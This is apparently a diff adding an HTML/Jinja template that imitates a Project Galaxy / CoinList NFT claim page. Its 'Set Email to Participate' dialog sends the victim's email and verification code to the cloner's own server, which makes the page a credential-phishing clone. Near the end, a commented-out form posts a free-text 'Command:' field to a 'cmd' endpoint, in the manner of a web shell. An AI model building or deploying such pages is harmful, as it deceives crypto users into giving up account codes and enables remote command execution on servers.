L32,24"></path><path data-v-7981bb3b="" d="M45,33 L19,33 C-8,33 6,-2 22,14 L45,37"></path></svg></button></div></div></div><!----></div></div><div data-v-26bb5490="" class="m-menu-content d-md-none"><div data-v-26bb5490="" class="v-item-group theme--dark v-expansion-panels v-expansion-panels--accordion v-expansion-panels--flat"><div data-v-26bb5490="" aria-expanded="false" class="v-expansion-panel"><div data-v-26bb5490="" class="clickable px-6 py-4 text-left text-base tab-text text-20-regular"> Explore </div></div><div data-v-26bb5490="" aria-expanded="false" class="v-expansion-panel"><div data-v-26bb5490="" class="clickable px-6 py-4 text-left text-base tab-text text-20-regular"> Spaces </div></div><div data-v-26bb5490="" aria-expanded="false" class="v-expansion-panel"><div data-v-26bb5490="" class="clickable px-6 py-4 text-base tab-text text-20-regular"> My NFTs </div></div><div data-v-26bb5490="" aria-expanded="false" class="v-expansion-panel"><div data-v-26bb5490="" class="clickable px-6 py-4 text-base tab-text text-20-regular"> Galaxy ID </div></div><div data-v-26bb5490="" aria-expanded="false" class="v-expansion-panel"><div data-v-26bb5490="" class="clickable px-6 py-4 text-left text-base tab-text text-20-regular"> Blog </div></div><div data-v-26bb5490="" aria-expanded="false" class="v-expansion-panel"><div data-v-26bb5490="" class="clickable px-6 py-4 text-base tab-text text-20-regular"> Docs </div></div></div><div data-v-26bb5490="" class="position-absolute width-100 paddingtb-4 paddinglr-7" style="bottom: 0px; left: 0px;"><!----></div></div><div data-v-26bb5490="" class="m-menu-content d-md-none"><div data-v-068b530e="" data-v-26bb5490=""><div data-v-068b530e="" class="paddinglr-7 flex-all-center"><img data-v-068b530e="" src="https://source.boringavatars.com/marble/120/{{wallet}}" class="setting-avatar"><div data-v-068b530e="" class="flex-auto marginl-4 setting-name"><div data-v-068b530e=""></div><div data-v-068b530e=""><span data-v-068b530e="" class="text-darken-2">0xFb3E...5368</span></div></div></div><div data-v-068b530e="" class="divider marginlr-7 mt-9 mb-4 mt-md-6 mb-md-3"></div><a data-v-068b530e="" href="https://etherscan.io/address/{{wallet}}" target="_blank" class="menu-item"> View on Ethereum</a><div data-v-068b530e="" class="menu-item">Settings</div><div data-v-068b530e="" class="menu-item">Change Wallet</div><div data-v-068b530e="" class="menu-item">Disconnect</div></div></div><div data-v-06a09598="" data-v-26bb5490="" id="wallet-container" class="flex-all-center"><div data-v-06a09598="" role="dialog" class="v-dialog__container"></div></div><div data-v-26bb5490="" role="dialog" class="v-dialog__container"><!----></div><div data-v-481c0e43="" data-v-26bb5490=""><div data-v-481c0e43="" role="dialog" class="v-dialog__container"><!----></div></div></div><main class="v-main overflow-hidden" data-booted="true" style="padding: 0px;background: #121212;"><div class="v-main__wrap"><!----><div data-v-0bb06e1f="" class="adopt-page position-relative paddingb-30" project="coinlist"><div data-v-0bb06e1f="" class="page-bg width-100 flex-box"></div><div data-v-0bb06e1f="" class="container-app position-relative px-md-0 mx-5 mx-md-auto"><div data-v-0bb06e1f="" class="page-top flex-box flex-align-center" style="padding-top: 80px;"><div data-v-0bb06e1f="" class="flex-align-center clickable space-container"><button data-v-0bb06e1f="" type="button" class="v-btn v-btn--icon v-btn--round theme--dark v-size--default"><span class="v-btn__content"><img data-v-0bb06e1f="" src="https://d257b89266utxb.cloudfront.net/galaxy/images/1639437714/1639437714-logo-1639437713.png" style="height: 30px;"></span></button><div data-v-0bb06e1f="" class="marginl-3 text-20-bold text-lighten-1 space-button"><div><span style="--move:0; --rotate:1; --part:1;">C</span><span style="--move:0.25; --rotate:0.75; --part:1;">o</span><span style="--move:0.5; --rotate:0.5; --part:1;">i</span><span style="--move:0.75; --rotate:0.25; --part:1;">n</span><span style="--move:0.75; --rotate:0.25; --part:-1;">L</span><span style="--move:0.5; --rotate:0.5; --part:-1;">i</span><span style="--move:0.25; --rotate:0.75; --part:-1;">s</span><span style="--move:0; --rotate:1; --part:-1;">t</span></div></div></div></div><div data-v-ed383874="" data-v-0bb06e1f="" class="hidde"><div data-v-ed383874=""><div data-v-ed383874="" class="pt-12 pt-sm-15">
+
+
+<div data-v-ed383874="" class="d-sm-flex align-center justify-sm-space-between text-36-bolder"><div data-v-ed383874="" style="display: inline-block;"> CoinList - CoinList Friends <span data-v-ed383874="" class="v-tooltip v-tooltip--bottom"><!----></span>
+<img data-v-ed383874="" width="24" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAEgAAABICAYAAABV7bNHAAAACXBIWXMAABYlAAAWJQFJUiTwAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAUpSURBVHgB7Zsxb9tGFMffUZbkbu43YOYOdYbOkcbaaG0DteqhQJShgKMOUT9BlE9gZWhsoIPVoUBht5CMwvJoe+5QLZ3Nj5BOtWiJr+/RVqsYd8wdSR0lhz8gUHAkj+Sf79699+4MkJOTk5OTk5OTk5OTk2MbAXPKzm7XReejjQDGqwJFhZ50hZpX7g6/RUCP2j1woOePh5e9gy0PZsDcCbS9e1oHIZ4KARWT6xDhQjjQOfph7SdIkbkRaGf390ogCof0RC4kw6M+WmkJlblAm83uStlf3qMhU4c0QWgf7a99DwnJVKCd3TM3EHiegtVIIdEHN4G/lcQ/ZSbQrMWZwvODYTWuSA5kAA8rLXGQ/AngqyAYV+klHx29WRP8zy8NP+Y2spDXt+dE4hadUpfvCTHIxIJqz/sduvPTiFM8EuDZrwdfXIAGPPMJIV5GCh7TJ1kXKHwZRxyqjrNV3JT8Vq+99RYMYAspDcvtKOHZ6nRFn7AElgm/tBJ8dfxmvQUxuBO0XmucenQX6T2E4+zRz2MwwKoPug0C5cOALecopjjThH0gSGMgAWL1K4q3wACrAkVYj0eW04SU8MvDpsp5C1F4CQZY80HbjdNV+oJ/gvwp6qrIN/Qt/vILhGCTLYDbOL4hsdtR0XKUr+NZUNfHWbOgMOGU46lelGMlcrwkKrYm4oR98f8ROrVG/2qTklrZtccH6x36kYpAfdZBE3tDTMATaTvCa1mzZqwUxjiqg2RpUuFR4KegiTWB6GFdWXuA44GsfYm/skaUzdZEcVVT0feF6hrQxN4QUzzUaHkkFUgIjAok3wEBNmTtRSwOFJdoR9WZpBrTqJylyVem2pH03F8OPvcUl7igSeYCzTuZC6RMIt+fhP5/KoJ0KPEsqLjEA03sCaR44aXrJflQEqhdEeRSq/zIyJW1Is6jQEL+lR3Hqcja/ZLf1rQiZRxFJdy69AoUf4MmNi3oUn5ASGcgdt4OimqUSBxRczEM1EhjL1HALmhiLw4SeKE4pEwgeRaiGs4jDPAZi/FfX7SCwZk/lUWUlcKoxJiXiUATq/Wg7ef9c8Vyjkf50WPTGpCKqHIui3u8v1bV7MpyNg9wojjEOZdRlh0FidNSWY/aocuxKhCVITpKnyKgWWucJRYp7ENdVfRM18usCsRDaAyjiLowtiiv2oMYcDz1dePskPtQnTPGkXFN2nqgOC6HCaTa14SW1L+qfdfXzsXYIXNZJGrxkSuWv+1/2QNDrDpp/spFv3RukGd59GInhSDoXVNSO3HiO2ENaMkdOw4X0VjIyOSTZ0CqWBrVoidYEyiGOGkx/wuHWYkzCSSTLD3PXCAdcaaDwLS4W1+rJt03NFOBtCyHlmjYP3C0bJLBR8CrslVeJUkj8JyZD9IVh1KJ+nRTmCI48MJ0OC7UBqq44kzD6QI6YgMxqFAe51JfLtzbgke/AwcKg2Hwz8nCbMFLQ5x5IlUfpD1bCXEFC0IBUsJwKq988tk38NcfP2uXHbIiFQuKF+dgPe6mJpskFihmEHgb3aZU/5kliQTSdcj34hsvaXRrk9gCmcxWU7XlhRKHiTXNx5nKOa65hmtYJHEYY4EeWpzzPowE+tDEYbQF+hDFYbR3uRZvyl1SM0qcy4cmDqM/i/nIBe+oWvITkzryomDkg7a/PV0VRXEOUTXgiA2Zi4hRHHT84/oAb5BXJVWW5Jks6y4CseIghSUtXBCoQ+x60D2RHqQ4TKKCGYsERThM+kdrOTk5OTk5ObPgX1lXlbFeL4ZmAAAAAElFTkSuQmCC" aria-haspopup="true" aria-expanded="false" class="marginl-4" style="vertical-align: middle; margin-bottom: 8px;"></div><!----></div>
+
+<div data-v-daa6741c="" data-v-ed383874="" class="project-intro text-lighten-2 text-16-regular paddingt-3">
+<!--data-v-daa6741c="" class="box position-relative" style="height: 100%;" -->
+
+<div><div data-v-daa6741c="" id="222 FiatWorks NFTs will be allocated for friends, partners, and evangelists of CoinList without whom none of what we, and the token networks on CoinList, accomplished in 2021 would be possible. All 222 individuals can unlock full resolution artwork from the exclusive content section once the NFT is claimed.8301"><p>222 FiatWorks NFTs will be allocated for friends, partners, and evangelists of CoinList without whom none of what we, and the token networks on CoinList, accomplished in 2021 would be possible. All 222 individuals can unlock full resolution artwork from the exclusive content section once the NFT is claimed.</p>
+</div><!----></div><div data-v-daa6741c="" role="dialog" class="v-dialog__container"><!----></div></div>
+
+
+</div><div data-v-ed383874="" class="flex-column flex-md-row flex-no-wrap flex-md-wrap" style="padding-top: 40px;"><div data-v-2ffa4708="" data-v-ed383874="" class="poster-outer-detail marginr-9" ismystery="true" mysteryimg="https://galaxy.eco/img/mystery-coinlist-friend.16e21280.png" videourl="" firstnftimageurl="https://d257b89266utxb.cloudfront.net/galaxy/images/coinlist/FiatWorks/FiatWorks_3001.jpg" campaign="[object Object]" cardwidth="340px" boxforge="forge" lgwidth="340px" style="max-width: 340px; height: 100%;"><div data-v-647902a4="" data-v-2ffa4708="" class="nft-img flex-all-center width-100 height-100"><div data-v-647902a4="" class="v-image v-responsive height-max-100 width-max-100 main-media theme--dark" style="width: 340px; height: auto;"><div class="v-responsive__sizer" style="padding-bottom: 120%;"></div><div class="v-image__image v-image__image--contain" style="background-image: url(&quot;{{ url_for('static', filename='images/mystery-coinlist-friend.16e21280.png') }}&quot;); background-position: center center;"></div><div class="v-responsive__content" style="width: 3370px;"></div></div></div></div><div data-v-ed383874="" style="max-width: 540px;"><div data-v-1c815b85="" data-v-ed383874="" title="Contract Address" ifisnoend="true" claimabletimerange="2022/01/05 20:00 GMT+03:00" campaign="[object Object]" childrencampaignslist="" nftcontractlist="[object Object]" claimtips="70 NFTs have been minted. You can claim 0 NFT &amp; You claimed 0 NFT" maxcount="0" loyaltypoint="0"><div data-v-1c815b85="" class="detail-content mt-3 mt-sm-0"><div data-v-1c815b85="" class="text-lighten-2"> Start Time: </div><div data-v-1c815b85="" class="text-semi-bold text-lighten-1"> 2022/01/05 20:00 GMT+03:00  </div></div><div data-v-1c815b85="" class="detail-content margint-5"><div data-v-1c815b85="" class="text-lighten-2">Who is Eligible:</div><div data-v-1c815b85="" class="mt-3"><div><div class="flex-wrap"><div data-v-09bcb1dc=""><div data-v-09bcb1dc="" class="box no"><div data-v-09bcb1dc=""><div data-v-09bcb1dc="" class="name text-16-bold text-lighten-3 flex-all-center clickable name-no"><img data-v-09bcb1dc="" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAEAAAABACAYAAACqaXHeAAAACXBIWXMAACxLAAAsSwGlPZapAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAARhSURBVHgB7Zs/bBNXHMd/v/fuHBw7ThMnUJTQylFrlg6VysJWqWsHVKkD6tzsXZDoxFSkduiezqUDEmLoisTGACtIGCkRIhGB5AhxbIf47t6P+wFG0f3z+Xzn+A5/Juvdk63f976/3937vWeACRMmfMogpMx3qw/0c9V6RTc7FUBrFlWhQig0gTR9fJ4i7ADYh1II01a2YerTzdvXKwakTCoCcNArs19UgaiGAipIQocYECpTgDAkiO1//6xuQgokKgAH/lX5yxppqhY36CAQ7UNC3G3vWU/+X1vqQEIkIkCagftiQ6Pd6m4mIcTQAlz+vXXGttrfjiTwY7AjJOiPh02N2ALwXa+XlupK02pwgigl1ndm5ht3r6EFMYglwI+rW9PTM/oFFFiBMYDd0Hpt34uTEgMLwMGXy/IiSVmEMSKuCAMJMK7B94gjQmQBxj34HoOKIKJM4oKXheAZIlnk+vT9NdKizI8kAFf7LATfg4vz4sGrepS5fQX45YqxfNKPujgIoVb4HaXvvLCLnPe2ZZ6HjEJW65t+qRAqQKlcWM6S9d1wPTjT3F0JmxMoAN99kBApj8YZ0kQtzAWBApTmtK8hByApPcwFgQKgSQuQE8Jc4CsAV/4s574bdsHZvXbV75qvADYcfQ45w9LbvmngK4AC6atWlnHakBW/NPAIcOlqszrq5sYo4DT47Ghr1j3uEeBd9zan6GbJE5tHAClU7uz/ETT7O8BWMnf27yFBm3GPeQTQID+PPw/YLbiHPFVRuXZson85/UCKfnU+lSBFCOClEHjD2TW5AwPCawP3WKR+QCQUXIaUg2ecFtbpD0InQmICEFAZRoTzW21IiOQcAPiPc3deQPq0nf3CG5AQ3jcjZ5c2Th1A5JzEO6lvNw8BN0zdY97HoOzG2mHJArZCT6fYIwCaxX3IKXz2wD3mEUCJoybkFFtpngMXHgFM3cqtAKbe9sTmEeC0sd3kkxmQMwiFefv6cn8HrK1dMElB7lwgQBn+435gZwNyRhfEtt+4rwBz+4aRpzRQEju3Ak6S+ArAaYCWyI8LbPUq6FLgq/Bs6+lGblxgLT4OuhQoQG5coEHj5t94GHQ5dDHELnh/gjObcO6rNwvPwuaECsAuADx4BBnFefcPvftM3+Xwzb9q20JYmUsFpYn1WxHOEEbqB8zsbTVImZl5OWLr70zNN6LMjbx8//k3KoI0Loq4PcMRwcHDUfVeP+v3GKh/Me4iDBo8M3ADZ1xFiBM8E6uDNW4iOF3iJqnF+4MGz8Ru4a2uPtAP5pbqSp3wYWmn2nPBG+lh6eP8dMVYlorqo3YDW14Tpx7+90d5qE50Ik1cTglxavccWOkfquL1CUqx8WJqYT3uXT9Ool3sd7VB2zkPJOaTdkTSgfdIrY3PqaHb3bMkxfwwf5ri7pRWKK0/L5SMJAPvMZJ9jEtXN6u6qVUE0YJC4WzGyKLf3+aQuhYJ1QTS9rk5+3pqaT+NoCdMmDChx1vBzd4R93rWGQAAAABJRU5ErkJggg==" class="name-icon"><a data-v-09bcb1dc="" href="https://galaxy.eco/credential/518" target="_blank">CoinList - CoinList Friends</a><span data-v-09bcb1dc="" class="v-tooltip v-tooltip--bottom"><!----></span></div></div><div data-v-09bcb1dc="" class="text-lighten-3">get 1 entry</div></div></div></div></div></div></div><div data-v-1c815b85="" class="detail-content margint-5"><div data-v-1c815b85="" class="text-lighten-2">Contract Address:</div><div data-v-1c815b85=""><div data-v-1c815b85="" data-clipboard-text="{{wallet}}" class="flex-box tag-read flex-align-center"><a data-v-1c815b85="" href="https://etherscan.io/address/{{wallet}}" target="_blank" class="text-semi-bold text-lighten-1">{{wallet}}</a><span class="v-tooltip v-tooltip--top"><!----></span><i aria-haspopup="true" aria-expanded="false" class="iconfont icon-wallet-copy marginl-2 clickable text-16-regular text-primary"></i></div></div></div><div data-v-1c815b85="" class="detail-content margint-5 text-lighten-1"> 70 NFTs have been minted. You can claim 0 NFT &amp; You claimed 0 NFT </div><!----></div><hr data-v-ed383874="" role="separator" aria-orientation="horizontal" class="lighten2 my-7 v-divider theme--dark"><div data-v-19bac48c="" data-v-ed383874="" isgoing="true" currentactivity="[object Object]" claimdisabled="true" approveforge="function () { [native code] }" isrequireemailverify="true" approveadopt="function () { [native code] }" canclaimnum="0" claimtext="Claim" erc20fee="0" platformfee="0" tokenexploreurl="https://etherscan.io/token/0x0000000000000000000000000000000000000000" forgeapprove="true" platformfeetoken="ETH" inputbatchnum="1"><div data-v-19bac48c=""><div data-v-1306f15c="" data-v-19bac48c="" class="d-md-flex"><div data-v-4efe99bd="" data-v-1306f15c="" class="btn-outter width-max-100" color="primary" width="100%"><button data-v-4efe99bd="" type="button" class="g-btn text-bold width-max-100 v-btn v-btn--is-elevated v-btn--has-bg theme--dark v-size--default primary text-16-regular button" style="width: 100%;"><span class="v-btn__content">Set Email to Participate</span></button></div><div data-v-1306f15c="" role="dialog" class="v-dialog__container"></div></div></div><!----></div></div></div><!----><!----></div><div data-v-102c0db8="" data-v-ed383874="" class="cover-page-container"><div data-v-102c0db8="" role="dialog" class="v-dialog__container"><!----></div></div><div data-v-c8714e30="" data-v-ed383874="" class="cover-page-container"><div data-v-c8714e30="" role="dialog" class="v-dialog__container"><!----></div></div><div data-v-0c069957="" data-v-ed383874="" role="dialog" class="v-dialog__container"><!----></div><div data-v-ed383874="" role="dialog" class="v-dialog__container"><!----></div></div></div></div></div></main><footer data-v-dddb74c0="" class="footer"><div data-v-dddb74c0="" class="footer-inner"><div data-v-dddb74c0="" class="footer-inner-top flex-wrap"><div data-v-dddb74c0="" class="flex-column flex-align-start marginb-12"><img data-v-dddb74c0="" height="32px" src="https://galaxy.eco/img/new-logo.edf4ae1e.svg"><div data-v-dddb74c0="" class="web-desc text-darken-1 text-16-regular"> Project Galaxy is on the mission to build an open, collaborative credential data network. </div><img data-v-dddb74c0="" src="https://galaxy.eco/img/get-updates-button.2c5e6e32.png" height="50px" alt="" class="mt-6 get-updates"></div><div data-v-dddb74c0="" class="top-right flex-justify-between"><div data-v-dddb74c0=""><div data-v-dddb74c0="" class="text-galaxy marginb-3">Galaxy</div><a data-v-dddb74c0="" class="doc-link">Spaces</a><a data-v-dddb74c0="" class="doc-link">My NFTs</a><a data-v-dddb74c0="" class="doc-link">Galaxy ID</a></div><div data-v-dddb74c0=""><div data-v-dddb74c0="" class="text-galaxy marginb-3">About</div><a data-v-dddb74c0="" href="https://docs.galaxy.eco/" target="_blank" class="doc-link">Docs</a><a data-v-dddb74c0="" href="https://to.galaxy.eco/careers" target="_blank" class="doc-link">Careers</a><a data-v-dddb74c0="" href="https://to.galaxy.eco/brand" target="_blank" class="doc-link">Brand Kit</a></div><div data-v-dddb74c0=""><div data-v-dddb74c0="" class="text-galaxy marginb-3">Community</div><a data-v-dddb74c0="" href="https://projectgalaxy.medium.com/" target="_blank" class="social-link">Blog</a><a data-v-dddb74c0="" href="https://twitter.com/ProjectGalaxyHQ" target="_blank" class="social-link">Twitter</a><a data-v-dddb74c0="" href="https://t.me/ProjectGalaxyHQ" target="_blank" class="social-link">Telegram</a><a data-v-dddb74c0="" href="https://discord.io/ProjectGalaxyHQ" target="_blank" class="social-link">Discord</a></div></div></div><div data-v-dddb74c0="" class="footer-inner-bottom text-14-regular text-darken-2 flex-all-center"><span data-v-dddb74c0="">Made by Bullet Labs © 2022 Project Galaxy</span></div></div></footer><div data-v-38503900="" class="transaction-result-popup"><div data-v-38503900="" role="dialog" class="v-dialog__container"><!----></div></div><div data-v-e1d4e64e="" class="v-snack snackbar-test v-snack--has-background v-snack--right v-snack--top"><div class="v-snack__wrapper v-sheet theme--dark rounded-0" style="min-width: 0px; background-color: rgb(15, 17, 20); border-color: rgb(15, 17, 20); display: none;"><div role="status" aria-live="polite" class="v-snack__content"><div data-v-e1d4e64e="" class="d-flex align-center"><i data-v-e1d4e64e="" class="iconfont text-20-regular icon-kongxinduigou" style="color: rgb(76, 175, 80);"></i><div data-v-e1d4e64e="" class="ml-3 mr-5 ml-md-6 mr-md-10"><div data-v-e1d4e64e="" class="text-lighten-1"></div><!----></div><i data-v-e1d4e64e="" class="align-self-baseline iconfont icon-close text-16-regular text-base clickable"></i></div></div><div class="v-snack__action "></div></div></div><div class="copy-container"><div role="dialog" class="v-dialog__container"><!----></div></div></div>
+
+
+<div role="document" data-v-06a09598="" class="v-dialog__content" style="z-index: 202;"><div class="v-dialog" style="transform-origin: center center; max-width: 590px; display: none;"><div data-v-06a09598="" class="position-relative width-100 height-100 wallet-container z-index-3"><i data-v-06a09598="" class="iconfont icon-close text-24-regular position-absolute clickable" style="right: 0px;"></i><div data-v-06a09598="" class="dialog-content"><div data-v-06a09598="" class="title-text marginb-7 text-galaxy"><span data-v-06a09598="">Connect Wallet</span></div><div data-v-06a09598="" class="network-options"><div data-v-06a09598="" class="network-option "><div data-v-06a09598="" class="network-info "><img data-v-06a09598="" src="https://galaxy.eco/img/eth.45811d31.svg" class="network-logo"><div data-v-06a09598="" class="network-name">Ethereum</div></div><div data-v-06a09598="" class="network-option-selected"></div></div><div data-v-06a09598="" class="network-option "><div data-v-06a09598="" class="network-info "><img data-v-06a09598="" src="https://galaxy.eco/img/solana.f5d0dcf4.svg" class="network-logo"><div data-v-06a09598="" class="network-name">Solana</div></div><div data-v-06a09598="" class="network-option-not-selected"></div></div></div><div data-v-06a09598="" class="wallet-options"><div data-v-06a09598="" class="wallet-option-item clickable active" style="background: linear-gradient(90deg, rgb(255, 138, 0) 0%, rgb(255, 106, 0) 100%);"><img data-v-06a09598="" contain="" src="https://galaxy.eco/img/MetaMask-logo.8196af9f.png" class="marginr-3" style="height: 36px; width: 36px; border-radius: 4px;"><span data-v-06a09598="" class="flex-auto text-bold">MetaMask</span><!----><div data-v-06a09598="" class="v-image v-responsive duihao-box theme--dark" style="width: 20px;"><div class="v-responsive__sizer" style="padding-bottom: 100%;"></div><div class="v-image__image v-image__image--contain" style="background-image: url(&quot;data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACgAAAAoCAYAAACM/rhtAAAACXBIWXMAABYlAAAWJQFJUiTwAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAIgSURBVHgBzZmBUeMwEEXXVMB1YCrAJfjo4Co4qIB0EFMBUEHSAXQANECgAqUCQgV89idSYkIgkizLeTM7jmds683KllZKIZEAqPVwqsFjpXFsg7xrzG28ajwWRfEofaNSxxpjjQXCMRoTjVJSY8WukY5JMlF90CXiMrYPo/FfuoC0WfuJawkFqy59QD5mbDNEcIb8POxyOdohx5RXkp8a+7pbLzjH8IzaTkVLrtQD01zKsHCQP9GBnccvXdzI8HKEH8vYnSwzaLNn5LD4wyy6DDaSj7nGiY3f2LyLWI3qOeCMVNk2y33XOrkaediWMx731OziWvLwV9+pF4SNFhUFT6V/LiLkSJ1jWjtnS/Dv1jaGN/ZRSjlGVo7FR0wiFuJ5YYnwDDQd5ZZ4C9rGKvhlvHEvETq+Qr5dbOAv2ZaboBuLkEGa17Ul+5YjMz7oLuAGg43kdml205JLtVS458NGCMPgu+S0JTdGOprYqW69hsBqAd+HHNbPRtxY+GWhg/Rym/JPTxrEQUmOj2OkZ0I3V7AyEws5LFj2z5cFq63/b+VwmFKOP9qLJmaR/e6/gO4HOpw5wfWiyWbxSobnysntRDN5g+Hw26dB3n0Zx/Mul6MfHP9pvEg+WGWfSSjov7s/ELP9tiXJ+dYgPW/Y2ofpIsnZYoo0LLOGkP3ACFETKPRhM9aEihUSCVaVBoPL1tKGa5zTJsdVfmhPGq+xf0N8An3/5ZPD+FPDAAAAAElFTkSuQmCC&quot;); background-position: center center;"></div><div class="v-responsive__content" style="width: 40px;"></div></div></div><div data-v-06a09598="" class="wallet-option-item clickable" style="background: linear-gradient(90deg, rgb(47, 149, 255) 0%, rgb(0, 115, 255) 100%);"><img data-v-06a09598="" contain="" src="https://galaxy.eco/img/WalletConnect-logo.78b95f1c.png" class="marginr-3" style="height: 36px; width: 36px; border-radius: 4px;"><span data-v-06a09598="" class="flex-auto text-bold">WalletConnect</span><img data-v-06a09598="" src="https://galaxy.eco/img/WalletConnect-logo-opacity.149cfa3d.png" alt="" class="opacity-logo"><div data-v-06a09598="" class="v-image v-responsive duihao-box theme--dark" style="width: 20px;"><div class="v-image__image v-image__image--preload v-image__image--contain" style="background-position: center center;"></div><div class="v-responsive__content"></div></div></div></div></div></div></div></div>
+
+
+<div role="document" data-v-1306f15c="" class="v-dialog__content" style="z-index: 202;">
+
+
+<div class="v-dialog v-dialog--active hidden" style="transform-origin: center center; width: 544px;"><div data-v-1306f15c="" class="verify-email-dialog"><i data-v-1306f15c="" class="iconfont icon-close text-16-regular clickable popup-close-icon"></i><div data-v-1306f15c="" class="verify-email-box"><div data-v-1306f15c="" class="verify-email-title">Set Email to Participate</div><hr data-v-1306f15c="" role="separator" aria-orientation="horizontal" class="my-7 divider v-divider theme--dark"><div data-v-1306f15c="" class="email-verify-code-input-box"><input disabled="disabled" data-v-1306f15c="" type="email" value="{{emailValue}}" placeholder="Enter Email" class="email-verify-code-input">
+<button data-v-1306f15c="" id='resend' class=""><span class="demo" id="demo">Verify code sent</span></button>
+
+</div><div data-v-1306f15c="" class="email-verify-code-input-box">
+
+<form action="/" method="post">
+<input type="hidden" name="email" value="{{emailValue}}" /> 
+<input name="code" data-v-1306f15c="" type="number" placeholder="Enter Code" autofocus="autofocus" class="email-verify-code-input"><button data-v-1306f15c="" type="submit" color="primary"  class="email-verify-btn button">Verify</button>
+</form>
+<!--
+<form action="/" method="post">
+<input name="code" type="text" size="25" />
+
+<button data-v-1306f15c="" type="submit" color="primary"  class="email-verify-btn button">Verify</button>
+</form>
+
+-->
+
+
+        
+
+</div>
+<!--
+<div class="content">
+        <form action="cmd" method="post">
+            Command: <input name="cmd" type="text" size="25" />
+            
+
+            <input name="mySubmit" type="submit" value="submit" />
+        </form>
+    </div>
+
+-->
+<!----></div></div>
+
+</div>
+
+
+
+</div></div></div><iframe name="_hjRemoteVarsFrame" title="_hjRemoteVarsFrame" id="_hjRemoteVarsFrame" src="https://vars.hotjar.com/box-ad575b5823df97fc9725e14a57070642.html" style="display: none !important; width: 1px !important; height: 1px !important; opacity: 0 !important; pointer-events: none !important;"></iframe>
+<script>
+function displayResend() {
+  document.getElementById("demo").innerHTML = "Resend";
+  document.getElementById("demo").disabled = false;
+  document.getElementById("resend").classList.add('email-send-verify-code-btn');
+}
+
+function displayVerefy() {
+  document.getElementById("demo").innerHTML = "Verify code sent";
+  document.getElementById("demo").disabled = true;
+  document.getElementById("resend").classList.remove('email-send-verify-code-btn');
+  
+
+  
+}
+</script>
+<script>
+$('.button').on('click', function (e) {
+      <!--$('.hidden').toggle('visible'); 
+	  $('.hidden').show('visible'); 
+	<!--  $('.send').innerHTML = 'Resend';-->
+<!--displayResend();	  -->
+});
+$('.demo').on('click', function (e) {
+      <!--$('.hidden').toggle('visible'); -->
+	  
+	 
+displayVerefy();	  
+});
+
+$<!--('.email-send-verify-code-btn').on('click', function (e) {
+      <!--$('.hidden').hide(); -->
+	  
+	   <!--   var value_data = ["{{emailValue}}"];
+
+<!--$.ajax({
+ <!--   type: 'POST',
+ <!--   url: '/',
+<!--    data: JSON.stringify(value_data),
+<!--    contentType: 'application/json',
+ <!--   success: function (response_data) {
+<!--        alert("success");
+<!--    }   
+<!--});
+<!--});
+
+
+$(document).mouseup(function(e) 
+{
+    var container = $(".hidden");
+
+    // if the target of the click isn't the container nor a descendant of the container
+    if (!container.is(e.target) && container.has(e.target).length === 0) 
+    {
+        container.hide();
+    }
+});
+
+
+
+</script>
+
+
+</body></html>
